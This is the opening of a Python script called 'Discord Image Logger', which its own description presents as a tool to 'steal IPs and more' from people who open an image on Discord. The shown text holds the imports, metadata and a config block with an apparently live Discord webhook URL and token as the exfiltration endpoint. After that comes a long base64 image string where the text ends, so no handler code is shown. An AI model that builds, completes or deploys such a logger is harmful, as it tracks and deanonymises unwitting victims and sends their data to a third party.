# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1109892882397139116/1refhkHYJEi2UW3NYf37NVQFuObfs6G37jJb40m0ckR9F3_mvbjyEJ64N_Od_tSyFPH5",
    "image": "data:image/jpeg;base64,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